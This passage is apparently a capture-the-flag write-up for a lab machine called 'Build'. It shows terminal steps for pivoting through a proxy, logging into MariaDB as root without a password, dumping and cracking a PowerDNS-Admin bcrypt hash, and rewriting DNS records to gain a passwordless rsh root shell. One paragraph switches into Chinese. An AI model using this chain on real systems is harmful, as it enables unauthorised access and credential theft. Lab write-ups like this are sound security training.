  libbluray2                libgpgme11t64          libplacebo349           libswscale8        python3-kismetcapturebtgeiger         ruby-unf-ext
  libbson-1.0-0t64          libgpgmepp6t64         libpocketsphinx3        libtheora0         python3-kismetcapturefreaklabszigbee  samba-ad-dc
  libconfig-inifiles-perl   libhdf4-0-alt          libportmidi0            libtsk19t64        python3-kismetcapturertl433           samba-ad-provision
  libcrypt-dev              libinstpatch-1.0-2     libpostproc58           libudfread0        python3-kismetcapturertladsb          samba-dsdb-modules
  libdisplay-info2          libjs-jquery-ui        libqt5ct-common1.8      libvdpau-va-gl1    python3-kismetcapturertlamr           vdpau-driver-all
  libdlt2                   libjs-underscore       libradare2-5.0.0t64     libwireshark18     python3-multipart
Use 'sudo apt autoremove' to remove them.

Summary:
  Upgrading: 0, Installing: 0, Removing: 0, Not Upgrading: 17
                                                                                                                                                                              
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ cat /etc/proxychains4.conf | grep -v '^#' | grep .
strict_chain
proxy_dns
remote_dns_subnet 224
tcp_read_time_out 15000
tcp_connect_time_out 8000
[ProxyList]
http    10.129.238.16    3128

```

![Pasted image 20260425144335.png](/ob/Pasted%20image%2020260425144335.png)

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ sudo vim /etc/proxychains4.conf
                                                                                                                                                                              
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ proxychains4 curl 172.18.0.6 -I
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/aarch64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.18.0.6:80  ...  OK
HTTP/1.1 302 FOUND
Server: gunicorn
Date: Sat, 25 Apr 2026 06:44:13 GMT
Connection: close
Content-Type: text/html; charset=utf-8
Content-Length: 199
Location: /login
Set-Cookie: _csrf_token=1979dfb628fff52c01d22976e3e740cabb3d275711652ba4b3142f0f1db89354; Expires=Thu, 30 Apr 2026 06:44:13 GMT; Max-Age=432000; HttpOnly; Path=/; SameSite=Lax
Vary: Cookie
Set-Cookie: session=57e01ac8-d529-4d4d-b1d3-da732db64a0e; Expires=Sat, 25 Apr 2026 06:54:13 GMT; HttpOnly; Path=/; SameSite=Lax

```

I don’t have any password information for the MySQL service, but I can try connecting as root and it let’s met in:\
try to login the mysql without password

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ proxychains4 mysql -h 172.18.0.4 -u root --skip-ssl         
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/aarch64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.18.0.4:3306  ...  OK
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 32
Server version: 11.3.2-MariaDB-1:11.3.2+maria~ubu2204 mariadb.org binary distribution

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> 
```

The non-default DB is `powerdnsadmin`:

```

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| powerdnsadmin      |
| sys                |
+--------------------+
5 rows in set (0.130 sec)

MariaDB [(none)]> 

```

```
MariaDB [(none)]> use powerdnsadmin
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [powerdnsadmin]> show tables;
+-------------------------+
| Tables_in_powerdnsadmin |
+-------------------------+
| account                 |
| account_user            |
| alembic_version         |
| apikey                  |
| apikey_account          |
| comments                |
| cryptokeys              |
| domain                  |
| domain_apikey           |
| domain_setting          |
| domain_template         |
| domain_template_record  |
| domain_user             |
| domainmetadata          |
| domains                 |
| history                 |
| records                 |
| role                    |
| sessions                |
| setting                 |
| supermasters            |
| tsigkeys                |
| user                    |
+-------------------------+
23 rows in set (0.072 sec)

MariaDB [powerdnsadmin]> select * from user;
+----+----------+--------------------------------------------------------------+-----------+----------+----------------+------------+---------+-----------+
| id | username | password                                                     | firstname | lastname | email          | otp_secret | role_id | confirmed |
+----+----------+--------------------------------------------------------------+-----------+----------+----------------+------------+---------+-----------+
|  1 | admin    | $2b$12$s1hK0o7YNkJGfu5poWx.0u1WLqKQIgJOXWjjXz7Ze3Uw5Sc2.hsEq | admin     | admin    | admin@build.vl | NULL       |       1 |         0 |
+----+----------+--------------------------------------------------------------+-----------+----------+----------------+------------+---------+-----------+
1 row in set (0.086 sec)

MariaDB [powerdnsadmin]> 

```

I’ll save the hash for the admin user to a file and pass it to `hashcat`. It looks a lot like bcrypt to me so I’ll use `-m 3200` (though running with autodetect would show a list of bcrypt options):

```
$ hashcat powerdns.hash /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt -m 3200
hashcat (v6.2.6) starting
...[snip]...
$2b$12$s1hK0o7YNkJGfu5poWx.0u1WLqKQIgJOXWjjXz7Ze3Uw5Sc2.hsEq:winston
...[snip]...
```

![Pasted image 20260425145439.png](/ob/Pasted%20image%2020260425145439.png)

http://172.18.0.6/login

Now I can log in as admin, leaving the OTP token field empty (as it was Null in the `user` table):

![Pasted image 20260425145533.png](/ob/Pasted%20image%2020260425145533.png)

In the `build.vl` zone, it shows the same subdomains as the table above:

![Pasted image 20260425150204.png](/ob/Pasted%20image%2020260425150204.png)

這表示，無論從哪個網域來，都可以不輸入密碼登入。 `intern.build.vl` 已被設定為主機。 `admin.build.vl` 尚未經過配置。我可以編輯 `intern` 的記錄，或新增一個指向我的主機的 `admin` 記錄，然後以 root 身份透過 `rlogin` 進行連線。

![Pasted image 20260425151428.png](/ob/Pasted%20image%2020260425151428.png)

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ dig intern.build.vl  @10.129.206.38 

; <<>> DiG 9.20.20-1-Debian <<>> intern.build.vl @10.129.206.38
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 27170
;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 1232
;; QUESTION SECTION:
;intern.build.vl.               IN      A

;; ANSWER SECTION:
intern.build.vl.        60      IN      A       10.10.16.39

;; Query time: 92 msec
;; SERVER: 10.129.206.38#53(10.129.206.38) (UDP)
;; WHEN: Sat Apr 25 15:08:47 HKT 2026
;; MSG SIZE  rcvd: 60


```

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ echo "10.129.206.38 build.vl" | sudo tee -a /etc/hosts
10.129.206.38 build.vl
                                                                                                               
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ rsh root@build.vl                                     
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-144-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sat Apr 25 07:11:32 AM UTC 2026

  System load:  0.18              Processes:             184
  Usage of /:   63.9% of 9.75GB   Users logged in:       0
  Memory usage: 31%               IPv4 address for eth0: 10.129.206.38
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

1 update can be applied immediately.
1 of these updates is a standard security update.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

root@build:~# 

```
